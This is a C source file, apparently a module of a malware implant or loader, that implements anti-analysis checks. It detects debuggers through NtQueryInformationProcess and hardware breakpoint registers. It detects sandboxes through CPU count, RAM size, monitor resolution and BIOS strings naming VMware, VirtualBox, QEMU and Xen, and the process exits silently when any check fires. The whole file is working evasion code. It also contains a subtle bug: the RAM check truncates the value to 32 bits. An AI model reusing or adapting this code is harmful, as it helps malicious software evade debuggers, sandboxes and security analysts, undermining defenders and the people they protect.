// Anti-Analysis.c
#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

extern WIN32_API g_Win32;

#define STATUS_PORT_NOT_SET		0xC0000353

/*=========================================
@ Anti-Debugging Functions
===========================================*/
BOOL CheckDebugger() {

	NTSTATUS					Status					= { 0 };
	DWORD64						IsDebuggerPresent		= { 0 };
	DWORD64						ProcessDebugObject		= { 0 };

	if (!NT_SUCCESS(Status = g_Win32.Nt.NtQueryInformationProcess(NtCurrentProcess(), ProcessDebugPort, &IsDebuggerPresent, sizeof(DWORD64), NULL))) {
#ifdef DEBUG
		DBGPRINT("[-] NtQueryInformationProcess Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if (IsDebuggerPresent != NULL) {
		// Debugger detected
		return TRUE;
	}

	if ((Status = g_Win32.Nt.NtQueryInformationProcess(NtCurrentProcess(), ProcessDebugObjectHandle, &ProcessDebugObject, sizeof(DWORD64), NULL)) != STATUS_SUCCESS && Status != STATUS_PORT_NOT_SET) {
#ifdef DEBUG
		DBGPRINT("[-] NtQueryInformationProcess[2] Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if (ProcessDebugObject != NULL) {
		// Debugger detected
		return TRUE;
	}

	return FALSE;
}

//=====================================================================================================================================

BOOL HardwareBreakpointCheck() {
	
	CONTEXT							Ctx			= { .ContextFlags = CONTEXT_ALL };
	NTSTATUS						Status		= { 0 };

	if (!NT_SUCCESS(Status = g_Win32.Nt.NtGetContextThread(NtCurrentThread(), &Ctx))) {
#ifdef DEBUG
		DBGPRINT("[-] NtGetContextThread Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if (Ctx.Dr0 != NULL || Ctx.Dr1 != NULL || Ctx.Dr2 != NULL || Ctx.Dr3 != NULL)
		return TRUE; // Debugger detected

	return FALSE;
}

/*=========================================
@ Anti-Sandbox Functions
===========================================*/
BOOL CheckHardwareSpecs() {

	SYSTEM_INFO					SystemInfo			= { 0 };
	MEMORYSTATUSEX				MemStatus			= { .dwLength = sizeof(MEMORYSTATUSEX) };

	GetSystemInfo(&SystemInfo);

	if (SystemInfo.dwNumberOfProcessors <= 2) {
		return TRUE;
	}

	if (!GlobalMemoryStatusEx(&MemStatus)) {
#ifdef DEBUG
		DBGPRINT("[-] GlobalMemoryStatusEx Failed With Error -> [%d] - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	if ((DWORD)MemStatus.ullTotalPhys <= (DWORD)(2 * 1073741824)) {
		return TRUE;
	}

	return FALSE;
}

//=====================================================================================================================================

BOOL CALLBACK MonitorResolutionCallback(HMONITOR Monitor, HDC hdcMonitor, LPRECT lpRect, LPARAM lData) {

	INT						X				= { 0 };
	INT						Y				= { 0 };
	MONITORINFO				MonitorInfo		= { .cbSize = sizeof(MONITORINFO) };
	
	if (!GetMonitorInfoW(Monitor, &MonitorInfo)) {
#ifdef DEBUG
		DBGPRINT("[-] GetMonitorInfoW Failed With Error -> [%d] - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	X = MonitorInfo.rcMonitor.right - MonitorInfo.rcMonitor.left;

	Y = MonitorInfo.rcMonitor.top - MonitorInfo.rcMonitor.bottom;

	if (X < 0)
		X = -X;
	if (Y < 0)
		Y = -Y;

	if ((X != 1920 && X != 2560 && X != 1440) || (Y != 1080 && Y != 1200 && Y != 1600 && Y != 900))
		*((BOOL*)lData) = TRUE; // Sandbox Detected

	return TRUE;
}

BOOL CheckMonitorResolution() {

	BOOL			IsSandbox		= FALSE;

	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)MonitorResolutionCallback, (LPARAM)(&IsSandbox));

	return IsSandbox;
}

//=====================================================================================================================================

/*
	https://github.com/arxhr007/Sandbox-Detection-Techniques/blob/main/sandbox_detector.c
*/

BOOL CheckDeviceBIOS() {
	
	CHAR				Buffer[4096]		= { 0 };
	DWORD				Size				= { 0 };
	HKEY				Key					= { 0 };

	LPCSTR VmIndicators[] = {
		"VMware",
		"VBOX",
		"Virtual",
		"Xen",
		"innotek",
		"QEMU"
	};

	INT Count = sizeof(VmIndicators) / sizeof(VmIndicators[0]);

	if ((g_Win32.AdvApi.RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &Key)) == 0) {

		Size = sizeof(Buffer);

		if ((g_Win32.AdvApi.RegQueryValueExW(Key, L"SystemManufacturer", NULL, NULL, (LPBYTE)Buffer, &Size)) == 0) {

			for (DWORD i = 0; i < Count; i++) {
				
				if (STRSTR(Buffer, VmIndicators[i]) != NULL) {
					g_Win32.AdvApi.RegCloseKey(Key);
					return TRUE;
				}
			}
		}

		Size = sizeof(Buffer);

		if ((g_Win32.AdvApi.RegQueryValueExW(Key, L"SystemProductName", NULL, NULL, (LPBYTE)Buffer, &Size)) == 0) {

			for (DWORD i = 0; i < Count; i++) {

				if (STRSTR(Buffer, VmIndicators[i]) != NULL) {

					g_Win32.AdvApi.RegCloseKey(Key);

					return TRUE;
				}
			}
		}

		g_Win32.AdvApi.RegCloseKey(Key);
	}

	return FALSE;
}

//=====================================================================================================================================
//=====================================================================================================================================
//=====================================================================================================================================

VOID PerformAntiAnalysisCheck() {

	// Check for debuggers via NtQueryInformationProcess
	if (CheckDebugger()) {
#ifdef DEBUG
		DBGPRINT("[!] Anti-Analysis Triggered -> Debugger Detected Via NtQueryInformationProcess \n");
#endif
		ExitProcess(0);
	}

	// Check for debuggers via Hardware Breakpoints
	if (HardwareBreakpointCheck()) {
#ifdef DEBUG
		DBGPRINT("[!] Anti-Analysis Triggered -> Debugger Detected Via Hardware Breakpoints \n");
#endif
		ExitProcess(0);
	}

	// Check for sandbox via hardware specs
	if (CheckHardwareSpecs()) {
#ifdef DEBUG
		DBGPRINT("[!] Anti-Analysis Triggered -> Sandbox Environment Detected Via Hardware Specs \n");
#endif
		ExitProcess(0);
	}

	// Check for sandbox via monitor resolution
	if (CheckMonitorResolution()) {
#ifdef DEBUG
		DBGPRINT("[!] Anti-Analysis Triggered -> Sandbox Environment Detected Via Monitor Resolution \n");
#endif
		ExitProcess(0);
	}

	// Check for sandbox via device BIOS
	if (CheckDeviceBIOS()) {
#ifdef DEBUG
		DBGPRINT("[!] Anti-Analysis Triggered -> Sandbox Environment Detected Via Device BIOS \n");
#endif
		ExitProcess(0);
	}

#ifdef DEBUG
	DBGPRINT("[+] Anti-Analysis Checks Passed Successfully \n");
#endif
}